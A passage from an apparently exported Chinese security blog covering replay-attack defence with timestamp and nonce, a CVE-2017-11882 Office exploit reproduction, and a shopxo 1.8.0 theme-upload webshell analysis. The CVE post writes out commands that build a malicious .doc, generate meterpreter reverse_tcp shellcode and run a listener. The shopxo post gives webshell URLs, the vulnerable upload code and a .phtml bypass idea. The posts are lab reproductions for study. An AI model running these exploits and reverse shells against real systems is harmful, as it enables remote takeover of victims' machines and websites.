<li>同时使用<code>timestamp</code>和<code>nonce</code>参数: <ul>
<li><code>nonce</code>的一次性可以解决<code>timestamp</code>参数<code>60s</code>的问题</li>
<li><code>timestamp</code>可以解决<code>nonce</code>参数”集合”越来越大的问题</li>
<li>在<code>timestamp</code>方案的基础上，加上<code>nonce</code>参数，<code>timstamp</code>参数对于超过<code>60s</code>的请求，都认为非法请求，最终只需要存储<code>60s</code>的<code>nonce</code>参数的”集合”即可</li>
</ul>
</li>
</ul>
<p><img data-src="./%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB%E9%98%B2%E5%BE%A1%E6%B5%85%E6%9E%90/10.png" alt></p>
<ul>
<li>参数设计</li>
</ul>
<p><img data-src="./%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB%E9%98%B2%E5%BE%A1%E6%B5%85%E6%9E%90/11.png" alt></p>
<p><img data-src="./%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB%E9%98%B2%E5%BE%A1%E6%B5%85%E6%9E%90/12.png" alt></p>
<ul>
<li>判断<ul>
<li>如果在<code>60s</code>内，重放该<code>HTTP</code>请求，因为<code>nonce</code>参数已经在首次请求的时候被记录在服务器的<code>nonce</code>参数”集合”中，会被判断为非法请求</li>
<li>超过<code>60s</code>之后，<code>stime</code>参数就会失效，此时因为黑客不清楚<code>token</code>的值，所以无法重新生成签名</li>
</ul>
</li>
</ul>
<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>​    防止重放攻击并不能理解成防止<code>bp</code>抓包修改，防御的主要是钓鱼，条件竞争等攻击场景。</p>
]]></content>
      <categories>
        <category>安全方案</category>
      </categories>
      <tags>
        <tag>重放</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2017-11882漏洞复现</title>
    <url>/2020/11/14/blog_formal/security/%E5%BC%80%E6%BA%90%E6%BC%8F%E6%B4%9E/CVE-2017-11882%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="CVE-2017-11882漏洞复现"><a href="#CVE-2017-11882漏洞复现" class="headerlink" title="CVE-2017-11882漏洞复现"></a>CVE-2017-11882漏洞复现</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    国内Windows市场份额较大，至少市场占有率达到百分之90+。使用office的用户自然也不在少数，该漏洞通杀范围广，危害大(任意命令执行)，本文对此进行漏洞复现</p>
<a id="more"></a>

<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul>
<li><p>windows7 sp1 + office2007</p>
</li>
<li><p>kali2020</p>
</li>
<li><p>poc：<a href="https://github.com/unamer/CVE-2017-11882]" target="_blank" rel="noopener">https://github.com/unamer/CVE-2017-11882]</a>(<a href="https://github.com/unamer/CVE-2017-11882" target="_blank" rel="noopener">https://github.com/unamer/CVE-2017-11882</a></p>
</li>
</ul>
<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><ul>
<li>任意命令执行，肉鸡控制</li>
</ul>
<h2 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h2><ul>
<li>Office软件里面的 [公式编辑器] 造成的，由于编辑器进程没有对名称长度进行校验，导致缓冲区溢出，攻击者通过构造特殊的字符，可以实现任意代码执行</li>
<li>如果攻击者构建恶意<code>shellcode</code>,可以达到肉鸡控制</li>
</ul>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>office 2003</li>
<li>office 2007</li>
<li>office 2010</li>
<li>office 2013</li>
<li>office 2016</li>
</ul>
<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><ul>
<li>生成调用计算机的恶意<code>.doc</code>文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/sangfor/mywork/CVE-2017-11882-master# python CVE-2017-11882.py -c "cmd.exe /c calc.exe" -o 11882.doc</span><br><span class="line">Done.</span><br></pre></td></tr></table></figure>

<ul>
<li>windows7靶机打开</li>
</ul>
<p><img data-src="./CVE-2017-11882%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" alt></p>
<hr>
<ul>
<li>下面复现肉鸡控制</li>
<li>生成<code>shellcode</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom –platform windows –a x64 -p windows/meterpreter/reverse_tcp LHOST=192.168.29.130 LPORT=4444 -o ./sc.bin</span><br></pre></td></tr></table></figure>

<ul>
<li>生成感染的<code>doc</code>文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python CVE-2017-11882.py -c sc.bin -t 0 -i 1 -o cc.doc</span><br></pre></td></tr></table></figure>

<ul>
<li>使用msf进行监听</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">set LHOST 192.168.29.130</span><br><span class="line"></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<ul>
<li>模拟肉鸡打开文件</li>
</ul>
<p><img data-src="./CVE-2017-11882%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" alt></p>
<ul>
<li><code>kali</code>侧肉鸡上线</li>
</ul>
<p><img data-src="./CVE-2017-11882%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" alt></p>
<ul>
<li><code>meterpreter</code>进行会话管理</li>
</ul>
<p><img data-src="./CVE-2017-11882%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png" alt></p>
<p><img data-src="./CVE-2017-11882%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png" alt></p>
<p><img data-src="./CVE-2017-11882%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png" alt></p>
<p><img data-src="./CVE-2017-11882%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png" alt></p>
<h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><ul>
<li>保持系统更新</li>
<li>打补丁</li>
</ul>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>shopxo(180)后台getshell浅析</title>
    <url>/2021/01/18/blog_formal/security/%E5%BC%80%E6%BA%90%E6%BC%8F%E6%B4%9E/shopxo(180)%E5%90%8E%E5%8F%B0getshell%E6%B5%85%E6%9E%90/</url>
    <content><![CDATA[<h1 id="shopxo-180-后台getshell浅析"><a href="#shopxo-180-后台getshell浅析" class="headerlink" title="shopxo(180)后台getshell浅析"></a>shopxo(180)后台getshell浅析</h1><p>​    一个简单的开源漏洞复现，浅析</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    <code>shopxo</code>是一个开源购物CMS，其<code>1.8.0</code>存在后台<code>getshell</code>问题</p>
<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><img data-src="./shopxo(180)%E5%90%8E%E5%8F%B0getshell%E6%B5%85%E6%9E%90/1.png" alt></p>
<p><img data-src="./shopxo(180)%E5%90%8E%E5%8F%B0getshell%E6%B5%85%E6%9E%90/2.png" alt></p>
<h3 id="登录后台"><a href="#登录后台" class="headerlink" title="登录后台"></a>登录后台</h3><p><img data-src="./shopxo(180)%E5%90%8E%E5%8F%B0getshell%E6%B5%85%E6%9E%90/3.png" alt></p>
<ul>
<li>上传主题处存在任意文件上传导致后台<code>getshell</code></li>
</ul>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><ul>
<li>制作攻击包</li>
</ul>
<p><img data-src="./shopxo(180)%E5%90%8E%E5%8F%B0getshell%E6%B5%85%E6%9E%90/4.png" alt></p>
<p><img data-src="./shopxo(180)%E5%90%8E%E5%8F%B0getshell%E6%B5%85%E6%9E%90/5.png" alt></p>
<p><img data-src="./shopxo(180)%E5%90%8E%E5%8F%B0getshell%E6%B5%85%E6%9E%90/6.png" alt></p>
<ul>
<li><code>getshell</code>验证</li>
</ul>
<p><code>http://172.23.0.13/shopxo_180/public/static/index/shell/static_shell.php?4396=phpinfo();</code></p>
<p><img data-src="./shopxo(180)%E5%90%8E%E5%8F%B0getshell%E6%B5%85%E6%9E%90/7.png" alt></p>
<p><code>http://172.23.0.13/shopxo_180/application/index/view/shell/html_shell.php?4396=phpinfo();</code></p>
<p><img data-src="./shopxo(180)%E5%90%8E%E5%8F%B0getshell%E6%B5%85%E6%9E%90/8.png" alt></p>
<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><ul>
<li>核心代码</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 模板上传</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>   Devil</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@blog</span>     http://gong.gg/</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>  1.0.0</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@datetime</span> 2018-12-19T00:53:45+0800</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>    [array]          $params [输入参数]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">ThemeUpload</span><span class="params">($params = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 文件上传校验</span></span><br><span class="line">    $error = FileUploadError(<span class="string">'theme'</span>);</span><br><span class="line">    <span class="keyword">if</span>($error !== <span class="keyword">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> DataReturn($error, <span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 文件格式化校验</span></span><br><span class="line">    $type = <span class="keyword">array</span>(<span class="string">'application/zip'</span>, <span class="string">'application/octet-stream'</span>, <span class="string">'application/x-zip-compressed'</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array($_FILES[<span class="string">'theme'</span>][<span class="string">'type'</span>], $type))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> DataReturn(<span class="string">'文件格式有误，请上传zip压缩包'</span>, <span class="number">-2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 目录是否有权限</span></span><br><span class="line">    <span class="keyword">if</span>(!is_writable(ROOT.<span class="keyword">self</span>::$html_path))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> DataReturn(<span class="string">'视图目录没权限'</span>, <span class="number">-10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!is_writable(ROOT.<span class="keyword">self</span>::$static_path))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> DataReturn(<span class="string">'资源目录没权限'</span>, <span class="number">-10</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 资源目录</span></span><br><span class="line">    $dir_list = [</span><br><span class="line">        <span class="string">'_html_'</span>        =&gt; ROOT.<span class="keyword">self</span>::$html_path,</span><br><span class="line">        <span class="string">'_static_'</span>      =&gt; ROOT.<span class="keyword">self</span>::$static_path,</span><br><span class="line">    ];</span><br><span class="line">    <span class="comment"># die($_FILES['theme']['tmp_name']);</span></span><br><span class="line">    <span class="comment">// 开始解压文件</span></span><br><span class="line">    $resource = zip_open($_FILES[<span class="string">'theme'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line">    <span class="keyword">while</span>(($temp_resource = zip_read($resource)) !== <span class="keyword">false</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(zip_entry_open($resource, $temp_resource))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 当前压缩包中项目名称</span></span><br><span class="line">            $file = zip_entry_name($temp_resource);</span><br><span class="line">            <span class="comment"># echo $file;</span></span><br><span class="line">            <span class="comment"># echo &lt;/br&gt;;</span></span><br><span class="line">            <span class="comment">// 排除临时文件和临时目录</span></span><br><span class="line">            <span class="keyword">if</span>(strpos($file, <span class="string">'/.'</span>) === <span class="keyword">false</span> &amp;&amp; strpos($file, <span class="string">'__'</span>) === <span class="keyword">false</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 文件包对应系统所在目录</span></span><br><span class="line">                $is_has_find = <span class="keyword">false</span>;</span><br><span class="line">                <span class="keyword">foreach</span>($dir_list <span class="keyword">as</span> $dir_key=&gt;$dir_value)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(strpos($file, $dir_key) !== <span class="keyword">false</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        $file = str_replace($dir_key.<span class="string">'/'</span>, <span class="string">''</span>, $dir_value.$file);</span><br><span class="line">                        $is_has_find = <span class="keyword">true</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 没有匹配到则指定目录跳过</span></span><br><span class="line">                <span class="keyword">if</span>($is_has_find == <span class="keyword">false</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">echo</span> $file;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 截取文件路径</span></span><br><span class="line">                $file_path = substr($file, <span class="number">0</span>, strrpos($file, <span class="string">'/'</span>));</span><br><span class="line">                <span class="comment"># echo $file_path;</span></span><br><span class="line">                <span class="comment">// 路径不存在则创建</span></span><br><span class="line">                <span class="keyword">if</span>(!is_dir($file_path))</span><br><span class="line">                &#123;</span><br><span class="line">                    mkdir($file_path, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 如果不是目录则写入文件</span></span><br><span class="line">                <span class="keyword">if</span>(!is_dir($file))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment"># echo $file;</span></span><br><span class="line">                    <span class="comment">// 读取这个文件</span></span><br><span class="line">                    $file_size = zip_entry_filesize($temp_resource);</span><br><span class="line">                    $file_content = zip_entry_read($temp_resource, $file_size);</span><br><span class="line">                    file_put_contents($file, $file_content);</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// 关闭目录项  </span></span><br><span class="line">                zip_entry_close($temp_resource);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> DataReturn(<span class="string">'安装成功'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>代码说明：首先判断文件后缀，文件类型是否为压缩包，然后解压覆盖(一句话需要写到<code>_html_</code> <code>_static_</code>文件夹中，否则不会上传)</li>
</ul>
<hr>
<ul>
<li>新版本的修复方式</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 主题服务层</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>   Devil</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@blog</span>     http://gong.gg/</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>  0.0.1</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@datetime</span> 2016-12-01T21:51:08+0800</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThemeService</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// 静态目录和html目录</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> $html_path = <span class="string">'application'</span>.DS.<span class="string">'index'</span>.DS.<span class="string">'view'</span>.DS;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> $static_path = <span class="string">'public'</span>.DS.<span class="string">'static'</span>.DS.<span class="string">'index'</span>.DS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 排除的文件后缀</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> $exclude_ext = [<span class="string">'php'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 默认主题标识符</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@author</span>  Devil</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@blog</span>    http://gong.gg/</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@version</span> 1.0.0</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@date</span>    2020-11-20</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@desc</span>    description</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">DefaultTheme</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> MyC(<span class="string">'common_default_theme'</span>, <span class="string">'default'</span>, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取模板列表</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@author</span>   Devil</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@blog</span>     http://gong.gg/</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@version</span>  0.0.1</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@datetime</span> 2017-05-10T10:24:40+0800</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>    [array]          $params [输入参数]</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span>   [array]                  [模板列表]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">ThemeList</span><span class="params">($params = [])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $result = [];</span><br><span class="line">        $dir = ROOT.<span class="keyword">self</span>::$html_path;</span><br><span class="line">        <span class="keyword">if</span>(is_dir($dir))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>($dh = opendir($dir))</span><br><span class="line">            &#123;</span><br><span class="line">                $default_preview = __MY_PUBLIC_URL__.<span class="string">'static'</span>.DS.<span class="string">'common'</span>.DS.<span class="string">'images'</span>.DS.<span class="string">'default-preview.jpg'</span>;</span><br><span class="line">                <span class="keyword">while</span>(($temp_file = readdir($dh)) !== <span class="keyword">false</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(substr($temp_file, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">'.'</span> || in_array($temp_file, [<span class="string">'index.html'</span>]))</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    $config = $dir.$temp_file.DS.<span class="string">'config.json'</span>;</span><br><span class="line">                    <span class="keyword">if</span>(!file_exists($config))</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 读取配置文件</span></span><br><span class="line">                    $data = json_decode(file_get_contents($config), <span class="keyword">true</span>);</span><br><span class="line">                    <span class="keyword">if</span>(!<span class="keyword">empty</span>($data) &amp;&amp; is_array($data))</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="keyword">empty</span>($data[<span class="string">'name'</span>]) || <span class="keyword">empty</span>($data[<span class="string">'ver'</span>]) || <span class="keyword">empty</span>($data[<span class="string">'author'</span>]))</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        $preview = ROOT.<span class="keyword">self</span>::$static_path.$temp_file.DS.<span class="string">'images'</span>.DS.<span class="string">'preview.jpg'</span>;</span><br><span class="line">                        $result[] = <span class="keyword">array</span>(</span><br><span class="line">                            <span class="string">'theme'</span>     =&gt;  $temp_file,</span><br><span class="line">                            <span class="string">'name'</span>      =&gt;  htmlentities($data[<span class="string">'name'</span>]),</span><br><span class="line">                            <span class="string">'ver'</span>       =&gt;  str_replace(<span class="keyword">array</span>(<span class="string">'，'</span>,<span class="string">','</span>), <span class="string">', '</span>, htmlentities($data[<span class="string">'ver'</span>])),</span><br><span class="line">                            <span class="string">'author'</span>    =&gt;  htmlentities($data[<span class="string">'author'</span>]),</span><br><span class="line">                            <span class="string">'home'</span>      =&gt;  <span class="keyword">isset</span>($data[<span class="string">'home'</span>]) ? $data[<span class="string">'home'</span>] : <span class="string">''</span>,</span><br><span class="line">                            <span class="string">'preview'</span>   =&gt;  file_exists($preview) ? __MY_PUBLIC_URL__.<span class="string">'static'</span>.DS.<span class="string">'index'</span>.DS.$temp_file.DS.<span class="string">'images'</span>.DS.<span class="string">'preview.jpg'</span> : $default_preview,</span><br><span class="line">                            <span class="string">'is_delete'</span> =&gt; ($temp_file == <span class="string">'default'</span>) ? <span class="number">0</span> : <span class="number">1</span>,</span><br><span class="line">                        );</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                closedir($dh);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 模板上传</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@author</span>   Devil</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@blog</span>     http://gong.gg/</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@version</span>  1.0.0</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@datetime</span> 2018-12-19T00:53:45+0800</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>    [array]          $params [输入参数]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">ThemeUpload</span><span class="params">($params = [])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 文件上传校验</span></span><br><span class="line">        $error = FileUploadError(<span class="string">'theme'</span>);</span><br><span class="line">        <span class="keyword">if</span>($error !== <span class="keyword">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> DataReturn($error, <span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 文件格式化校验</span></span><br><span class="line">        $type = <span class="keyword">array</span>(<span class="string">'application/zip'</span>, <span class="string">'application/octet-stream'</span>, <span class="string">'application/x-zip-compressed'</span>);</span><br><span class="line">        <span class="keyword">if</span>(!in_array($_FILES[<span class="string">'theme'</span>][<span class="string">'type'</span>], $type))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> DataReturn(<span class="string">'文件格式有误，请上传zip压缩包'</span>, <span class="number">-2</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 目录是否有权限</span></span><br><span class="line">        <span class="keyword">if</span>(!is_writable(ROOT.<span class="keyword">self</span>::$html_path))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> DataReturn(<span class="string">'视图目录没权限['</span>.ROOT.<span class="keyword">self</span>::$html_path.<span class="string">']'</span>, <span class="number">-10</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!is_writable(ROOT.<span class="keyword">self</span>::$static_path))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> DataReturn(<span class="string">'资源目录没权限['</span>.<span class="keyword">self</span>::$static_path.<span class="string">']'</span>, <span class="number">-10</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 资源目录</span></span><br><span class="line">        $dir_list = [</span><br><span class="line">            <span class="string">'_html_'</span>        =&gt; ROOT.<span class="keyword">self</span>::$html_path,</span><br><span class="line">            <span class="string">'_static_'</span>      =&gt; ROOT.<span class="keyword">self</span>::$static_path,</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 开始解压文件</span></span><br><span class="line">        $resource = zip_open($_FILES[<span class="string">'theme'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line">        <span class="keyword">while</span>(($temp_resource = zip_read($resource)) !== <span class="keyword">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(zip_entry_open($resource, $temp_resource))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 当前压缩包中项目名称</span></span><br><span class="line">                $file = zip_entry_name($temp_resource);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 排除临时文件和临时目录</span></span><br><span class="line">                <span class="keyword">if</span>(strpos($file, <span class="string">'/.'</span>) === <span class="keyword">false</span> &amp;&amp; strpos($file, <span class="string">'__'</span>) === <span class="keyword">false</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// 文件包对应系统所在目录</span></span><br><span class="line">                    $is_has_find = <span class="keyword">false</span>;</span><br><span class="line">                    <span class="keyword">foreach</span>($dir_list <span class="keyword">as</span> $dir_key=&gt;$dir_value)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span>(strpos($file, $dir_key) !== <span class="keyword">false</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="comment">// 匹配成功文件路径处理、跳出循环</span></span><br><span class="line">                            $file = str_replace($dir_key.<span class="string">'/'</span>, <span class="string">''</span>, $dir_value.$file);</span><br><span class="line">                            $is_has_find = <span class="keyword">true</span>;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 没有匹配到则指定目录跳过</span></span><br><span class="line">                    <span class="keyword">if</span>($is_has_find == <span class="keyword">false</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 排除后缀文件</span></span><br><span class="line">                    $pos = strripos($file, <span class="string">'.'</span>);</span><br><span class="line">                    <span class="keyword">if</span>($pos !== <span class="keyword">false</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        $info = pathinfo($file);</span><br><span class="line">                        <span class="keyword">if</span>(<span class="keyword">isset</span>($info[<span class="string">'extension'</span>]) &amp;&amp; in_array($info[<span class="string">'extension'</span>], <span class="keyword">self</span>::$exclude_ext))</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 截取文件路径</span></span><br><span class="line">                    $file_path = substr($file, <span class="number">0</span>, strrpos($file, <span class="string">'/'</span>));</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 路径不存在则创建</span></span><br><span class="line">                    <span class="keyword">if</span>(!is_dir($file_path))</span><br><span class="line">                    &#123;</span><br><span class="line">                        mkdir($file_path, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 如果不是目录则写入文件</span></span><br><span class="line">                    <span class="keyword">if</span>(!is_dir($file))</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">// 读取这个文件</span></span><br><span class="line">                        $file_size = zip_entry_filesize($temp_resource);</span><br><span class="line">                        $file_content = zip_entry_read($temp_resource, $file_size);</span><br><span class="line">                        file_put_contents($file, $file_content);</span><br><span class="line">                    &#125;</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment">// 关闭目录项  </span></span><br><span class="line">                    zip_entry_close($temp_resource);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> DataReturn(<span class="string">'安装成功'</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>代码分析：解压的过程中会效验是否为 <code>php</code>结尾，如果是则直接跳过，不会复制</p>
</li>
<li><p>潜在问题：学过文件上传的都知道，<code>apache</code>会解析<code>phtml</code>, <code>php3</code>等后缀的文件，我们发现新版本是可以上传<code>phtml</code>文件的</p>
</li>
</ul>
<p><img data-src="./shopxo(180)%E5%90%8E%E5%8F%B0getshell%E6%B5%85%E6%9E%90/9.png" alt></p>
<p>但是，此版本的<code>TP</code>需要<code>php</code>版本大于<code>5.6</code>，但是<code>5.6</code>以上的<code>php</code>未能解析<code>phtml</code>文件成功</p>
<p>小于<code>5.6</code>的版本，<code>cms</code>无法运行</p>
<p><img data-src="./shopxo(180)%E5%90%8E%E5%8F%B0getshell%E6%B5%85%E6%9E%90/10.png" alt></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>开源CMS</tag>
      </tags>
  </entry>
  <entry>
